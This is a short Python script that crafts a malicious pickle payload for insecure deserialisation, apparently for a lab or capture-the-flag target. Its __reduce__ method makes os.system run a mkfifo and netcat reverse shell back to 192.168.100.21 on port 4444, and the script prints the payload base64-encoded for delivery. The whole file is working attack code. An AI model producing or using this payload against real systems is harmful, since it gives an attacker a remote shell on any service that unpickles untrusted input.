import pickle
import base64
import os

#test
class RCE:
    def __reduce__(self):
        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | ' '/bin/sh -i 2>&1 | nc 192.168.100.21 4444 > /tmp/f')
        # cmd = ('pwd')
        return os.system, (cmd,)


if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))
